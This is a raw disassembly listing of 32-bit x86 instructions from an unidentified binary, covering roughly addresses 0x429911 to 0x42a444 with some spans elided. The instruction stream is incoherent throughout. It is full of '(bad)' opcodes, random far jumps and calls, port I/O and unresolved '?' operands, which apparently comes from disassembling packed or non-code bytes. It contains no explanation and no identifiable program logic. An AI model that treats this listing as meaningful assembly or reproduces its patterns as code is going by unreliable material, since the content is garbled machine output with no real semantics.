  429911:	ja     0x42998e
  429913:	push   ecx
  429914:	inc    eax
  429915:	je     0x4298a5
  429917:	push   cs
  429918:	mov    ds:0x540827d2,eax
  42991d:	daa    
  42991e:	jmp    0x4298d1
  429920:	js     0x429956
  429922:	lods   eax,DWORD PTR ds:[esi]
  429923:	push   ebx
  429924:	xchg   esp,eax
  429925:	test   esp,0x5db53cd7
  42992b:	icebp  
  42992c:	mov    dh,0xf3
  42992e:	shr    BYTE PTR [edi+0x30],cl
  429931:	nop
  429932:	shl    DWORD PTR [esi-0x31f6e8f7],0x71
  429939:	xchg   BYTE PTR [eax],ch
  42993b:	pop    edx
  42993c:	xor    DWORD PTR [edi+0xb82858],0x0
	...
  4299b2:	add    BYTE PTR [eax],al
  4299b4:	dec    ebp
  4299b5:	or     al,0xf8
  4299b7:	pop    ebx
  4299b8:	stc    
  4299b9:	(bad)  
  4299ba:	out    dx,eax
  4299bb:	push   ds
  4299bc:	ins    BYTE PTR es:[edi],dx
  4299bd:	xchg   ecx,eax
  4299be:	cld    
  4299bf:	sub    edx,ecx
  4299c1:	call   0x1:0xb90dd2e8
  4299c8:	cmc    
  4299c9:	add    BYTE PTR [eax],al
  4299cb:	add    BYTE PTR [eax-0x5cde6c2a],bh
  4299d1:	xlat   BYTE PTR ds:[ebx]
  4299d2:	mov    edx,0xde42d761
  4299d7:	xchg   BYTE PTR [ebp+0x44],dl
  4299da:	push   cs
  4299db:	pop    ss
  4299dc:	and    esp,0xcfd17366
  4299e2:	maxps  xmm1,XMMWORD PTR [edi]
  4299e5:	lods   eax,DWORD PTR ds:[esi]
  4299e6:	xor    eax,0x5ff9bf7a
  4299eb:	sub    al,0x1a
  4299ed:	push   es
  4299ee:	or     DWORD PTR [edi+0x2a],ebx
  4299f1:	cmp    bh,0x2d
  4299f4:	inc    edx
  4299f5:	loop   0x4299e8
  4299f7:	sar    BYTE PTR [edx+ecx*4+0x5b],cl
  4299fb:	add    DWORD PTR [edi-0x161d1daa],ecx
  429a01:	fwait
  429a02:	stc    
  429a03:	xchg   esp,eax
  429a04:	jbe    0x4299f9
  429a06:	adc    BYTE PTR [esi],bh
  429a08:	lds    eax,FWORD PTR [edi+0x1c]
  429a0b:	popf   
  429a0c:	lds    eax,FWORD PTR [edx+0x5c8b712b]
  429a12:	xchg   edi,eax
  429a13:	ins    BYTE PTR es:[edi],dx
  429a14:	jb     0x429a80
  429a16:	shl    DWORD PTR [ebx+edx*1+0x352a040d],cl
  429a1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a1e:	fsubr  DWORD PTR [ebx+0x6e99b1ae]
  429a24:	test   BYTE PTR [ebp-0x310ca970],0xf3
  429a2b:	mov    BYTE PTR [bx-0x5a70],ch
  429a30:	outs   dx,DWORD PTR ds:[esi]
  429a31:	sbb    BYTE PTR [edx],bl
  429a33:	in     al,0xa0
  429a35:	shr    BYTE PTR [esi+0x7ddc33f8],cl
  429a3b:	scas   eax,DWORD PTR es:[edi]
  429a3c:	dec    edx
  429a3d:	mov    dl,0x94
  429a3f:	sub    ah,BYTE PTR [esi]
  429a41:	cs (bad) 
  429a43:	cdq    
  429a44:	in     eax,dx
  429a45:	es or  al,0xef
  429a48:	jge    0x429ab4
  429a4a:	adc    al,0x16
  429a4c:	in     al,dx
  429a4d:	cwde   
  429a4e:	sub    ebx,ebx
  429a50:	sahf   
  429a51:	shl    esi,1
  429a53:	inc    edx
  429a54:	retf   
  429a55:	ss dec esp
  429a57:	dec    ebx
  429a58:	pop    edi
  429a59:	repnz mov al,ds:0xecb13c3e
  429a5f:	in     al,0xc4
  429a61:	sbb    eax,0x4c6e0ba4
  429a66:	mov    edx,0xeb0723fa
  429a6b:	ret    0x84bf
  429a6e:	fdivr  DWORD PTR [esi-0x450f35be]
  429a74:	aaa    
  429a75:	pop    ebx
  429a76:	dec    ebx
  429a77:	imul   esi,DWORD PTR [edx+0x674674c8],0x42d003f2
  429a81:	pop    ebp
  429a82:	dec    eax
  429a83:	xor    ecx,0x19
  429a86:	mov    ch,0x48
  429a88:	and    al,0xdd
  429a8a:	popa   
  429a8b:	xchg   di,ax
  429a8d:	and    eax,0xe4b43df6
  429a92:	jne    0x429aa2
  429a94:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  429a96:	ss and al,0xc
  429a99:	xchg   esp,eax
  429a9a:	sar    DWORD PTR [eax],cl
  429a9c:	mov    esp,DWORD PTR [edx+0x37bf706]
  429aa2:	xchg   edx,eax
  429aa3:	shl    DWORD PTR [ebp-0x50],1
  429aa6:	push   esp
  429aa7:	xchg   ebp,eax
  429aa8:	and    al,0x30
  429aaa:	pusha  
  429aab:	xchg   esi,eax
  429aac:	xor    eax,0x445d5fa7
  429ab1:	(bad)  
  429ab3:	lods   al,BYTE PTR ds:[esi]
  429ab4:	sub    DWORD PTR [ecx+0x327a75df],ebx
  429aba:	dec    esp
  429abb:	mov    ebp,0x97d969bf
  429ac0:	imul   eax,DWORD PTR [eax],0x0
	...
  429b33:	add    ch,al
  429b35:	push   ebp
  429b36:	mov    bh,dl
  429b38:	call   0xe133:0xa97ff5ff
  429b3f:	ret    0xad7c
  429b42:	scas   al,BYTE PTR es:[edi]
  429b43:	xor    DWORD PTR [edx],eax
  429b45:	mov    edx,0xf50001
  429b4a:	add    BYTE PTR [eax],al
  429b4c:	out    0xe7,eax
  429b4e:	es mov esp,0x33027566
  429b54:	xchg   edx,eax
  429b55:	inc    ebx
  429b56:	mov    edx,0x500aa793
  429b5b:	add    BYTE PTR [eax+0x5345ed6e],bh
  429b61:	xor    BYTE PTR [ecx],dh
  429b63:	push   ebp
  429b64:	fstp   DWORD PTR [ebp-0x2f]
  429b67:	cmp    esp,DWORD PTR ds:0x31bce936
  429b6d:	or     ebx,ecx
  429b6f:	pop    es
  429b70:	(bad)  
  429b71:	sar    eax,1
  429b73:	repz xchg ecx,eax
  429b75:	test   DWORD PTR [esi-0x48677c99],0x332cecfe
  429b7f:	pop    esi
  429b80:	mov    ds:0xd9ab5a3b,eax
  429b85:	xor    ebx,DWORD PTR [esi]
  429b87:	pop    ds
  429b88:	adc    BYTE PTR [eax],dl
  429b8a:	or     eax,0x7e175eaa
  429b8f:	in     eax,dx
  429b90:	repnz sbb edi,esi
  429b93:	test   DWORD PTR [edi-0x3f8fc008],esi
  429b99:	mov    al,0x4
  429b9b:	iret   
  429b9c:	cmp    ebx,0x68b6288a
  429ba2:	sub    edi,DWORD PTR [ebx+0x30]
  429ba5:	shl    DWORD PTR [eax+0x63c444d7],1
  429bab:	rol    BYTE PTR [esi],cl
  429bad:	push   ebp
  429bae:	push   esp
  429baf:	repnz outs dx,DWORD PTR ds:[esi]
  429bb1:	inc    ebp
  429bb2:	push   edi
  429bb3:	sub    al,0x1b
  429bb5:	loopne 0x429bdf
  429bb7:	and    edi,edx
  429bb9:	jmp    0x429b5e
  429bbb:	mov    ch,0xfd
  429bbd:	pushf  
  429bbe:	repnz mov eax,ss:0x7dff0d7a
  429bc5:	sub    eax,0x6e5a0de5
  429bca:	or     eax,0x45531f85
  429bcf:	fstp   QWORD PTR gs:[edi-0xd]
  429bd3:	je     0x429bcc
  429bd5:	xor    al,bl
  429bd7:	je     0x429b68
  429bd9:	dec    ebx
  429bda:	pop    esp
  429bdb:	call   0x3fe0:0xf1deae0d
  429be2:	int3   
  429be3:	push   ecx
  429be4:	sbb    edx,ebp
  429be6:	aad    0x8f
  429be8:	repz and esp,ecx
  429beb:	movaps XMMWORD PTR [ecx+0x3cd4da99],xmm0
  429bf2:	xor    eax,ebx
  429bf4:	aaa    
  429bf5:	std    
  429bf6:	nop
  429bf7:	or     bl,BYTE PTR [eax]
  429bf9:	cli    
  429bfa:	aam    0x50
  429bfc:	mov    ch,0x53
  429bfe:	adc    DWORD PTR [ebp-0x46],0x12
  429c02:	add    BYTE PTR [esi],0xb8
  429c05:	jmp    0xe0e8c40e
  429c0a:	aam    0x0
  429c0c:	leave  
  429c0d:	sub    ebp,esi
  429c0f:	mov    bh,0xfa
  429c11:	jl     0x429c4d
  429c13:	dec    esi
  429c14:	push   esi
  429c15:	les    ebp,FWORD PTR [ecx-0x7c]
  429c18:	lea    ebx,[edi-0x490f34e9]
  429c1e:	addr16 pushf 
  429c20:	dec    ecx
  429c21:	jae    0x429bcc
  429c23:	cwde   
  429c24:	or     ch,ch
  429c26:	pop    ecx
  429c27:	fldcw  WORD PTR [eax+0x59]
  429c2a:	in     eax,dx
  429c2b:	and    eax,0x6142279e
  429c30:	and    ecx,DWORD PTR [ebx+0x10c18a69]
  429c36:	mov    eax,0xa5f0a215
  429c3b:	push   0x4c
  429c3d:	cli    
  429c3e:	add    ch,0x7f
	...
  429cb1:	add    BYTE PTR [eax],al
  429cb3:	add    BYTE PTR [ecx-0xace0e4b],al
  429cb9:	jne    0x429c7c
  429cbb:	mov    ch,0xdf
  429cbd:	xlat   BYTE PTR ds:[ebx]
  429cbe:	ins    BYTE PTR es:[edi],dx
  429cbf:	scas   al,BYTE PTR es:[edi]
  429cc0:	pusha  
  429cc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429cc2:	sbb    BYTE PTR [eax-0x9],0xba
  429cc6:	add    DWORD PTR [eax],eax
  429cc8:	cmc    
  429cc9:	add    BYTE PTR [eax],al
  429ccb:	add    BYTE PTR [eax],bh
  429ccd:	out    0x79,eax
  429ccf:	jb     0x429c75
  429cd1:	add    BYTE PTR [edi],0xba
  429cd4:	mov    edi,0x793a06a2
  429cd9:	into   
  429cda:	adc    DWORD PTR [ebx+0x4fb37911],edx
  429ce0:	lock jne 0x429cfa
  429ce3:	ror    BYTE PTR [eax],cl
  429ce5:	cmp    bl,ah
  429ce7:	ds out 0x97,al
  429cea:	adc    BYTE PTR [edi-0x5f],0xc8
  429cee:	mov    ds:0x12af75a8,al
  429cf3:	sti    
  429cf4:	call   0xe528:0x9fd9d07a
  429cfb:	sub    al,0x16
  429cfd:	repz pop ebx
  429cff:	dec    edi
  429d00:	pop    ecx
  429d01:	mov    eax,0x36b59c66
  429d06:	(bad)  
  429d07:	jg     0x429d37
  429d09:	inc    ebp
  429d0a:	cld    
  429d0b:	aad    0xd3
  429d0d:	pop    es
  429d0e:	scas   al,BYTE PTR es:[edi]
  429d0f:	arpl   WORD PTR [eax+edx*2-0x3c],bp
  429d13:	cmp    al,0x89
  429d15:	push   ebp
  429d16:	jbe    0x429d95
  429d18:	and    dh,BYTE PTR [edx]
  429d1a:	aaa    
  429d1b:	dec    esi
  429d1c:	aaa    
  429d1d:	xor    DWORD PTR [eax-0xe058011],edx
  429d23:	pop    esp
  429d24:	jge    0x429d0a
  429d26:	int3   
  429d27:	mov    al,0x94
  429d29:	pop    ecx
  429d2a:	cmp    al,0xb5
  429d2c:	pop    eax
  429d2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d2e:	jecxz  0x429cf5
  429d30:	scas   al,BYTE PTR es:[edi]
  429d31:	xor    bh,0x5d
  429d34:	js     0x429d65
  429d36:	mov    WORD PTR [ecx+0x11],ds
  429d39:	and    dh,ah
  429d3b:	stos   DWORD PTR es:[edi],eax
  429d3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d3d:	adc    eax,0x67652ae9
  429d42:	mov    cl,0xf
  429d44:	mov    ?,eax
  429d46:	aam    0x8e
  429d48:	outs   dx,DWORD PTR ds:[esi]
  429d49:	cdq    
  429d4a:	js     0x429d75
  429d4c:	xlat   BYTE PTR ds:[ebx]
  429d4d:	fcom   QWORD PTR [eax]
  429d4f:	js     0x429d0d
  429d51:	sub    al,0x2b
  429d53:	mov    ebp,0x59020400
  429d58:	test   eax,0x9985f26d
  429d5d:	sbb    al,0x79
  429d5f:	cmp    edi,DWORD PTR [ebp+edx*8-0x5ba7a737]
  429d66:	jmp    0x3350:0xb9ae7cf9
  429d6d:	imul   ebx,edi,0xf9824936
  429d73:	jmp    0xc608:0x933039b7
  429d7a:	inc    ebx
  429d7b:	imul   ebp,ecx,0x6
  429d7e:	into   
  429d7f:	pop    eax
  429d80:	jns    0x429de5
  429d82:	inc    ebp
  429d83:	push   0xea437b23
  429d88:	jg     0x429d40
  429d8a:	adc    bh,al
  429d8c:	adc    BYTE PTR ds:0x8c654a26,0x69
  429d93:	out    dx,al
  429d94:	mov    ebp,0xcf3687ff
  429d99:	rol    BYTE PTR [edx],1
  429d9b:	icebp  
  429d9c:	and    edx,ecx
  429d9e:	push   ds
  429d9f:	mov    al,0xdd
  429da1:	les    ebx,FWORD PTR [ecx]
  429da3:	mov    esi,0x1910c64d
  429da8:	pop    esi
  429da9:	retfw  
  429dab:	pushf  
  429dac:	retf   
  429dad:	push   es
  429dae:	add    bl,BYTE PTR [eax+0x6fd8c89c]
  429db4:	mov    ebx,0x19e1c4f0
  429db9:	pop    esp
  429dba:	aas    
  429dbb:	dec    edi
  429dbc:	mov    cl,0xd7
  429dbe:	sbb    DWORD PTR [ecx+eiz*2+0x0],edi
	...
  429e32:	add    BYTE PTR [eax],al
  429e34:	dec    edi
  429e35:	pop    ebp
  429e36:	pop    ecx
  429e37:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  429e3b:	fstp   QWORD PTR [eax+0x2b4e2ee0]
  429e41:	imul   eax,ecx,0x1bbec23
  429e47:	add    ch,dh
  429e49:	add    BYTE PTR [eax],al
  429e4b:	add    BYTE PTR [edx+0x6b04410f],dh
  429e51:	adc    BYTE PTR [ebx-0x6f5b9c18],bl
  429e57:	(bad)  
  429e58:	or     eax,DWORD PTR [ecx+0x73]
  429e5b:	idiv   WORD PTR [edi]
  429e5e:	imul   edi,DWORD PTR [edx],0xe7af80ed
  429e64:	sub    ch,dl
  429e66:	and    edi,DWORD PTR [eax]
  429e68:	or     bh,BYTE PTR [edi+0x11]
  429e6b:	inc    ebp
  429e6c:	pop    ebx
  429e6d:	out    0x52,al
  429e6f:	mov    dl,0xfd
  429e71:	cmp    DWORD PTR [ebx-0x45],esp
  429e74:	adc    esp,DWORD PTR [ebx-0x6b]
  429e77:	ja     0x429ef0
  429e79:	test   BYTE PTR [edi+0x13],bl
  429e7c:	ror    bl,1
  429e7e:	add    ecx,ebx
  429e80:	adc    ah,dl
  429e82:	xor    dh,cl
  429e84:	loop   0x429e74
  429e86:	add    esi,ebx
  429e88:	and    bh,BYTE PTR [ecx+eax*1]
  429e8b:	out    0x43,eax
  429e8d:	mov    al,0xd9
  429e8f:	dec    eax
  429e90:	or     al,BYTE PTR [ecx-0x58]
  429e93:	rcr    DWORD PTR [edx+0x2a],0xb
  429e97:	into   
  429e98:	cmp    edi,DWORD PTR [edi]
  429e9a:	jns    0x429ef4
  429e9c:	in     eax,dx
  429e9d:	cmp    eax,0xa85a9644
  429ea2:	sbb    ebx,DWORD PTR [ebx+edx*1-0x527eeab0]
  429ea9:	inc    ecx
  429eaa:	cld    
  429eab:	inc    ebx
  429eac:	frstor [ebp-0x3c70711d]
  429eb2:	xchg   esp,eax
  429eb3:	fiadd  DWORD PTR [esi+0x77]
  429eb6:	nop
  429eb7:	mov    ecx,0xdcf5bb02
  429ebc:	lods   al,BYTE PTR ds:[esi]
  429ebd:	mov    BYTE PTR [edx+0x69b879bb],bh
  429ec3:	mov    DWORD PTR [ebx+0x54f3cdf7],ebp
  429ec9:	sbb    dl,BYTE PTR [ebx+0x7d51071a]
  429ecf:	cmp    DWORD PTR [ebx-0x172714b0],ecx
  429ed5:	xchg   edx,eax
  429ed6:	push   ebx
  429ed7:	or     DWORD PTR [ecx+ecx*8+0x521d8c93],0x2099ad9e
  429ee2:	cli    
  429ee3:	sbb    BYTE PTR [edi],bh
  429ee5:	inc    eax
  429ee6:	adc    ecx,ecx
  429ee8:	fnstcw WORD PTR [ebx+0x28]
  429eeb:	push   ds
  429eec:	and    al,0xcb
  429eee:	cli    
  429eef:	cmp    al,0x96
  429ef1:	mov    dl,0x11
  429ef3:	dec    edx
  429ef4:	add    DWORD PTR [edi],edi
  429ef6:	in     al,dx
  429ef7:	repnz in eax,dx
  429ef9:	sub    eax,0x4dea8f23
  429efe:	pop    es
  429eff:	lock push ds
  429f01:	cmp    ebx,DWORD PTR [edi+0x17bb291e]
  429f07:	sub    eax,0xffffff8a
  429f0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429f0b:	sub    al,0x31
  429f0d:	jne    0x429ef3
  429f0f:	dec    ebp
  429f10:	lds    eax,FWORD PTR [ebx+0x37b25dda]
  429f16:	scas   al,BYTE PTR es:[edi]
  429f17:	leave  
  429f18:	in     al,0x2d
  429f1a:	test   eax,0xe21cd0dd
  429f1f:	sar    DWORD PTR [eax-0x6ceca1d8],cl
  429f25:	les    esp,FWORD PTR [ecx]
  429f27:	ds and eax,0x74326abd
  429f2d:	les    eax,FWORD PTR [eax+0x12]
  429f30:	jle    0x429fa8
  429f32:	xchg   edx,ebx
  429f34:	mov    edx,0x26e650cc
  429f39:	add    DWORD PTR [ebp+0x7],ecx
  429f3c:	into   
  429f3d:	mov    ecx,0x473477
	...
  429fb2:	add    BYTE PTR [eax],al
  429fb4:	loope  0x429fa2
  429fb6:	mov    ebx,es
  429fb8:	(bad)  
  429fb9:	jecxz  0x429faa
  429fbb:	out    dx,al
  429fbc:	sub    dh,BYTE PTR [eax+0x25d36d7b]
  429fc2:	cs mov ah,0xe1
  429fc5:	mov    esp,0xf50001
  429fca:	add    BYTE PTR [eax],al
  429fcc:	xor    DWORD PTR [edx],eax
  429fce:	or     al,0xc8
  429fd0:	xor    al,0xeb
  429fd2:	mov    ecx,0xf5128b0c
  429fd7:	dec    ebx
  429fd8:	retf   0xb620
  429fdb:	jne    0x429f7b
  429fdd:	mul    bh
  429fdf:	adc    dh,al
  429fe1:	pop    edx
  429fe2:	(bad)  
  429fe3:	dec    esp
  429fe4:	out    0xeb,al
  429fe6:	xchg   esi,eax
  429fe7:	cwde   
  429fe8:	stc    
  429fe9:	xchg   BYTE PTR [eax],ah
  429feb:	cmp    eax,0x267d489
  429ff0:	in     al,dx
  429ff1:	and    ebx,DWORD PTR [edi-0x54874d54]
  429ff7:	ret    0x367
  429ffa:	cwde   
  429ffb:	or     DWORD PTR [ecx-0xc65dffb],ecx
  42a001:	cmp    bl,0xa9
  42a004:	mov    esp,0x717ca5df
  42a009:	jmp    0x429fae
  42a00b:	push   cs
  42a00c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a00d:	je     0x429fa9
  42a00f:	inc    eax
  42a010:	add    edi,esp
  42a012:	aam    0x7d
  42a014:	pop    ds
  42a015:	mov    bl,BYTE PTR ds:0x31bfcd12
  42a01b:	pop    ss
  42a01c:	pop    edi
  42a01d:	mov    dh,0xc1
  42a01f:	mov    al,0xdf
  42a021:	sub    eax,0xe84f401a
  42a026:	inc    ecx
  42a027:	repnz and eax,0x9a25cab5
  42a02d:	jmp    0x42a048
  42a02f:	repz xchg edx,eax
  42a031:	pop    ds
  42a032:	adc    ah,BYTE PTR [ebx-0x79]
  42a035:	sbb    edx,eax
  42a037:	shr    DWORD PTR [edx+eax*1],1
  42a03a:	(bad)  
  42a03c:	push   ebp
  42a03d:	sbb    bh,BYTE PTR ss:[ebx+0x3e363fbf]
  42a044:	je     0x42a099
  42a046:	and    ah,bh
  42a048:	cwde   
  42a049:	cwde   
  42a04a:	inc    eax
  42a04b:	dec    esp
  42a04c:	add    edx,DWORD PTR [eax+0x1b]
  42a04f:	push   es
  42a050:	or     BYTE PTR [edx-0x27],ch
  42a053:	jmp    0x42a03d
  42a055:	je     0x42a02b
  42a057:	pop    esp
  42a058:	aad    0x6e
  42a05a:	popa   
  42a05b:	adc    eax,0xe4feda6f
  42a060:	ins    BYTE PTR es:[edi],dx
  42a061:	sub    ch,BYTE PTR [ebx-0xf832058]
  42a067:	into   
  42a068:	adc    al,0x2
  42a06a:	in     al,dx
  42a06b:	int3   
  42a06c:	push   ds
  42a06d:	xor    al,0x14
  42a06f:	mov    ebx,0x4f40640b
  42a074:	adc    edi,DWORD PTR [ebp-0x44432e95]
  42a07a:	fs imul ebx,edx,0x715d67b4
  42a081:	aad    0x2d
  42a083:	cdq    
  42a084:	aaa    
  42a085:	leave  
  42a086:	cmp    ch,ah
  42a088:	xor    esi,DWORD PTR [eax]
  42a08a:	js     0x42a0f1
  42a08c:	pop    ds
  42a08d:	sub    esp,DWORD PTR [ecx+0x39]
  42a090:	clc    
  42a091:	jp     0x42a0d0
  42a093:	cmp    ecx,DWORD PTR [ecx+0x21ec5149]
  42a099:	add    al,0xc9
  42a09b:	imul   ebp,DWORD PTR [edi+0x2a8cb69b],0x3f23b76f
  42a0a5:	xor    eax,0xa1227474
  42a0aa:	test   al,0x2f
  42a0ac:	mov    ds:0xd7272236,eax
  42a0b1:	out    0x1e,eax
  42a0b3:	pusha  
  42a0b4:	jae    0x42a04c
  42a0b6:	clc    
  42a0b7:	cmp    BYTE PTR [edi+0x5d],bl
  42a0ba:	and    ah,bl
  42a0bc:	ficomp DWORD PTR [eax+ebp*1]
  42a0bf:	imul   esp,DWORD PTR [eax+eax*1],0x0
	...
  42a133:	add    BYTE PTR [esi-0x79],dl
  42a136:	std    
  42a137:	test   ch,bh
  42a139:	(bad)  
  42a13a:	jg     0x42a113
  42a13c:	jbe    0x42a105
  42a13e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a13f:	(bad)  
  42a140:	icebp  
  42a141:	add    dl,BYTE PTR [ebx+0x21]
  42a144:	(bad)  
  42a145:	mov    ebp,0xf50001
  42a14a:	add    BYTE PTR [eax],al
  42a14c:	adc    al,0x72
  42a14e:	pop    eax
  42a14f:	loop   0x42a196
  42a151:	xchg   DWORD PTR [ebx],ebx
  42a153:	fsubr  DWORD PTR fs:[edi-0x58]
  42a157:	jmp    0xd12c:0x462ba555
  42a15e:	pop    ds
  42a15f:	icebp  
  42a160:	dec    ecx
  42a161:	add    DWORD PTR [edx-0x3ab56977],eax
  42a167:	imul   ecx,ecx,0xbb7fa3e7
  42a16d:	sbb    al,0x3d
  42a16f:	sbb    al,0xa7
  42a171:	push   esp
  42a172:	add    esi,edx
  42a174:	mov    bh,0x82
  42a176:	aad    0xa
  42a178:	in     eax,0x88
  42a17a:	(bad)  
  42a17b:	fcom   DWORD PTR [edi-0x341b4822]
  42a181:	cmp    DWORD PTR [eax-0x7a072b5a],esi
  42a187:	pop    ss
  42a188:	add    esi,DWORD PTR [esi-0x2f78c6c7]
  42a18e:	push   ebp
  42a18f:	ins    BYTE PTR es:[edi],dx
  42a190:	shr    BYTE PTR ds:0xe982d0a7,1
  42a196:	icebp  
  42a197:	pushf  
  42a198:	dec    edx
  42a199:	pop    ds
  42a19a:	adc    al,dl
  42a19c:	sub    ecx,ecx
  42a19e:	jp     0x42a1fb
  42a1a0:	jmp    0x8e2b7b23
  42a1a5:	sbb    DWORD PTR [esi-0x26d85a8c],0xffffffd1
  42a1ac:	sahf   
  42a1ad:	test   eax,0x5744fcf7
  42a1b2:	xor    BYTE PTR [esi],dl
  42a1b4:	adc    al,0xc4
  42a1b6:	mov    esp,DWORD PTR [ebx-0x57]
  42a1b9:	mov    bh,0x10
  42a1bb:	jle    0x42a1ea
  42a1bd:	leave  
  42a1be:	js     0x42a1a1
  42a1c0:	sbb    ch,cl
  42a1c2:	and    BYTE PTR ds:0xe140e2c,ah
  42a1c8:	jmp    0x74b4:0xc9a86af1
  42a1cf:	mov    dh,0x6d
  42a1d1:	std    
  42a1d2:	cdq    
  42a1d3:	cld    
  42a1d4:	dec    esi
  42a1d5:	adc    BYTE PTR ds:0xcd62cb1c,cl
  42a1db:	scas   eax,DWORD PTR es:[edi]
  42a1dc:	jecxz  0x42a216
  42a1de:	xor    ch,BYTE PTR [ecx]
  42a1e0:	mov    al,ds:0xac4e253c
  42a1e5:	xchg   ebp,eax
  42a1e6:	cmp    bh,BYTE PTR [ebx+0x60]
  42a1e9:	test   eax,0x371c4d62
  42a1ee:	mov    ecx,0x322d5219
  42a1f3:	jmp    0x76ad:0x18ea08c2
  42a1fa:	lds    ebx,FWORD PTR [ebx]
  42a1fc:	ins    DWORD PTR es:[edi],dx
  42a1fd:	jl     0x42a223
  42a1ff:	in     al,0x94
  42a201:	repnz adc DWORD PTR [esi+0x7a],ecx
  42a205:	dec    ebp
  42a206:	or     eax,0x9c67f2f3
  42a20b:	fdiv   QWORD PTR [ecx+0x770f00bf]
  42a211:	es and al,0xb6
  42a214:	jge    0x42a24c
  42a216:	ret    0x89d1
  42a219:	test   eax,0xcb1ac012
  42a21e:	(bad)  
  42a21f:	mov    dl,0xbc
  42a221:	cmp    DWORD PTR [edx-0x34451698],edx
  42a227:	mov    ebx,0x1f81a127
  42a22c:	sub    bl,BYTE PTR [eax]
  42a22e:	lea    edx,[ecx]
  42a230:	xor    DWORD PTR [eax],edi
  42a232:	cmp    al,0x30
  42a234:	fnstenv [eax-0x7ae4f94f]
  42a23a:	xlat   BYTE PTR ds:[ebx]
  42a23b:	bound  ebp,QWORD PTR [edi]
  42a23d:	les    esp,FWORD PTR [edx+0x39]
  42a240:	ins    BYTE PTR es:[edi],dx
	...
  42a2b1:	add    BYTE PTR [eax],al
  42a2b3:	add    al,dh
  42a2b5:	adc    al,0xe1
  42a2b7:	(bad)  
  42a2b8:	in     eax,0xff
  42a2ba:	call   FWORD PTR [esi]
  42a2bc:	xor    eax,0x627f8ab9
  42a2c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a2c2:	mul    bh
  42a2c4:	retf   
  42a2c5:	mov    esi,0xf50001
  42a2ca:	add    BYTE PTR [eax],al
  42a2cc:	ss je  0x42a340
  42a2cf:	ins    DWORD PTR es:[edi],dx
  42a2d0:	das    
  42a2d1:	sub    DWORD PTR [eax],esi
  42a2d3:	mov    ?,WORD PTR [eax+0x4d183d70]
  42a2d9:	pslld  mm2,QWORD PTR [edi]
  42a2dc:	mov    BYTE PTR [ebx-0x4e],ch
  42a2df:	dec    esi
  42a2e0:	mov    ds:0x7633031b,al
  42a2e5:	or     al,0x42
  42a2e7:	push   es
  42a2e8:	rol    DWORD PTR [bp+0x55],0xb
  42a2ed:	pop    eax
  42a2ee:	rcl    BYTE PTR [edx+0x16],cl
  42a2f1:	or     eax,0xb8116d3a
  42a2f6:	mov    ch,0x40
  42a2f8:	dec    esp
  42a2f9:	pop    eax
  42a2fa:	push   ds
  42a2fb:	or     BYTE PTR [ebp-0x73],dh
  42a2fe:	in     al,0xf
  42a300:	xchg   edi,eax
  42a301:	das    
  42a302:	mov    WORD PTR [ebp-0x5e779a8],gs
  42a308:	gs mov eax,0x9f336b6
  42a30e:	outs   dx,DWORD PTR ds:[esi]
  42a30f:	sub    DWORD PTR ds:0x44451012,ebp
  42a315:	ficom  WORD PTR [eax]
  42a317:	in     eax,dx
  42a318:	dec    eax
  42a319:	or     bh,BYTE PTR [ecx+0x7]
  42a31c:	mov    WORD PTR [esi+0x3ca6bc4a],ss
  42a322:	xlat   BYTE PTR ds:[ebx]
  42a323:	cs iret 
  42a325:	jp     0x42a2cc
  42a327:	leave  
  42a328:	sahf   
  42a329:	inc    ebp
  42a32a:	stos   DWORD PTR es:[edi],eax
  42a32b:	popf   
  42a32c:	and    dl,BYTE PTR [ebp-0x1e97defc]
  42a332:	imul   ecx,DWORD PTR [eax-0x11e6ca3c],0x6d899c50
  42a33c:	inc    esi
  42a33d:	call   0x1cb4:0x148507d7
  42a344:	mov    eax,0xfbf78893
  42a349:	or     DWORD PTR [ecx],esi
  42a34b:	pop    ecx
  42a34c:	cmp    BYTE PTR [esp+esi*4-0x3e99e7b5],0xc0
  42a354:	scas   al,BYTE PTR es:[edi]
  42a355:	jne    0x42a323
  42a357:	icebp  
  42a358:	aaa    
  42a359:	mov    ch,BYTE PTR [edx+ecx*4-0x23]
  42a35d:	jp     0x42a328
  42a35f:	aam    0x59
  42a361:	mov    cl,0xb1
  42a363:	xor    DWORD PTR [edi+0x2e],ecx
  42a366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a367:	dec    esp
  42a368:	pop    ss
  42a369:	popa   
  42a36a:	(bad)  
  42a36b:	push   esp
  42a36c:	jl     0x42a376
  42a36e:	loopne 0x42a348
  42a370:	sub    DWORD PTR [ebx+eiz*8+0x1],edx
  42a374:	call   0xc0d52580
  42a379:	and    eax,0xbcf44886
  42a37e:	mov    BYTE PTR [eax-0x4b0a2c9c],cl
  42a384:	popf   
  42a385:	test   esp,edi
  42a387:	or     edx,DWORD PTR [esi]
  42a389:	fnstcw WORD PTR [ebp+0x7134f8f3]
  42a38f:	jmp    0x42a34b
  42a391:	fadd   QWORD PTR [eax]
  42a393:	cmp    DWORD PTR [ebx-0x43877449],edx
  42a399:	aad    0x73
  42a39b:	sub    BYTE PTR [eax-0x38],ch
  42a39e:	mov    ebx,0xcef6e10f
  42a3a3:	cmp    ebp,eax
  42a3a5:	and    esi,0xbe478161
  42a3ab:	xchg   DWORD PTR [edx+ecx*8-0x1e70849d],ecx
  42a3b2:	inc    eax
  42a3b3:	push   eax
  42a3b4:	and    al,BYTE PTR [ecx+0x3]
  42a3b7:	mov    cl,0xb8
  42a3b9:	xchg   edx,eax
  42a3ba:	repz xchg esp,eax
  42a3bc:	push   0x14c26dad
	...
  42a431:	add    BYTE PTR [eax],al
  42a433:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  42a437:	sub    al,0x53
  42a439:	ds jg  0x42a4a9
  42a43c:	stos   BYTE PTR es:[edi],al
  42a43d:	dec    ebx
  42a43e:	push   edi
  42a43f:	jo     0x42a404
  42a441:	xchg   ecx,eax
  42a442:	out    0xf2,al
  42a444:	sar    BYTE PTR [edi+0xf50001],0x0
